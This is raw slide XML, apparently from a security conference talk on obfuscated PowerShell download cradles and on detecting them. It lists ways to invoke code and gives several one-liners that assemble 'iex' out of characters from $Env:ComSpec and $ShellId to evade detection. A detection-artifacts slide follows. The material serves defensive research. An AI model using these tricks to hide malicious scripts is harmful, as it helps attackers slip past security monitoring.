            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Alias/GAL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Command/GCM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>GetCmdlets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(PS1.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>InvokeScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS1.0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>+)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-Command/ICM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>PS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Runspace</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Concatenated IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>AsWorkflow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS3.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Dot-Source</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (Disk-based)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Import-Module/IPMO</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> (Disk-based)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Up Arrow 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="5172087" y="3171266"/>
            <a:ext cx="254448" cy="2782406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6613382" y="5775364"/>
            <a:ext cx="46082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http://i0.kym-cdn.com/photos/images/newsfeed/000/995/349/9c9.jpg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6274" y="1315191"/>
            <a:ext cx="4493118" cy="449311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13975" y="3816757"/>
            <a:ext cx="6274050" cy="2246769"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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&amp;(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Env:ComSpec</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>[4,26,25]-Join</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>''</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>.((LS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>env</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>:/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Co*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pec</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>).Value[4,26,25]-Join</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>.(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ShellId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>[1]+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ShellId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>[13]+'x')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>&amp;( (GV </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>S*ell*d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -V)[1]+(DIR Variable:\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>S*ell*d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>).Value[13]+'x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.( </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>([String]''.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IndexOf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)[0,7,8]-Join</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill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103" y="1316310"/>
            <a:ext cx="5715689" cy="1951912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103" y="3309083"/>
            <a:ext cx="5739157" cy="1735448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103" y="5079685"/>
            <a:ext cx="5763628" cy="462246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9872345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800" dirty="0" smtClean="0"/>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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1257156" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-Expression/IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Alias/GAL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Get-Command/GCM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>GetCmdlets</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>(PS1.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>InvokeScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS1.0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>+)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-Command/ICM</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>PS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Runspace</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Concatenated IEX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>AsWorkflow</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>(PS3.0+)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="914400" lvl="1" indent="-457200">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0" smtClean="0"/>
              <a:t>Dot-Source</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t> (Disk-based)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200" b="1" dirty="0" smtClean="0"/>
              <a:t>Import-Module/IPMO</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> (Disk-based)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
            </a:br>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="FF0000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210" y="6090466"/>
            <a:ext cx="1930499" cy="59693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8595" y="6052363"/>
            <a:ext cx="1841595" cy="673135"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Up Arrow 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="5172087" y="3171266"/>
            <a:ext cx="254448" cy="2782406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6613382" y="5775364"/>
            <a:ext cx="46082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http://i0.kym-cdn.com/photos/images/newsfeed/000/995/349/9c9.jpg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6274" y="1315191"/>
            <a:ext cx="4493118" cy="449311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13975" y="3816757"/>
            <a:ext cx="6274050" cy="2246769"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1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&amp;(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Env:ComSpec</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>[4,26,25]-Join</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>''</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>.((LS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>env</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>:/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Co*</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>pec</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>).Value[4,26,25]-Join</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>'')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t/>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>.(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ShellId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>[1]+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>$</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ShellId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>[13]+'x')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>&amp;( (GV </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>S*ell*d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> -V)[1]+(DIR Variable:\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>S*ell*d</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>).Value[13]+'x</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.( </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>([String]''.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IndexOf</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)[0,7,8]-Join</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>'')</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill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103" y="1316310"/>
            <a:ext cx="5715689" cy="1951912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103" y="3309083"/>
            <a:ext cx="5739157" cy="1735448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103" y="5079685"/>
            <a:ext cx="5763628" cy="462246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3388" y="2784465"/>
            <a:ext cx="11160114" cy="1782112"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:effectLst>
            <a:outerShdw blurRad="190500" sx="103000" sy="103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4413842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800" dirty="0" smtClean="0"/>
              <a:t>Outline</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Motivation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Current State of PowerShell Obfuscation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Current State of PowerShell Obfuscation Detection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MOAR! Crafting Cryptic Cradles :: (In)security By Obscurity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Download Cradles</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Token Obfuscation</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Obscure Invocation Syntaxes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent5"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Detecting Cryptic Cradles</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent5"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CradleCrafter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> v1.1 Release &amp; Demo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0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8595" y="6052363"/>
            <a:ext cx="1841595" cy="67313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210" y="6090466"/>
            <a:ext cx="1930499" cy="596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9810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Detecting Cryptic Cradles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/>
              <a:t>Artifacts for historical and real-time detection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Network connections</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Parent-child process relationships</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Event </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>logs</a:t>
            </a:r>
          </a:p>
          <a:p>
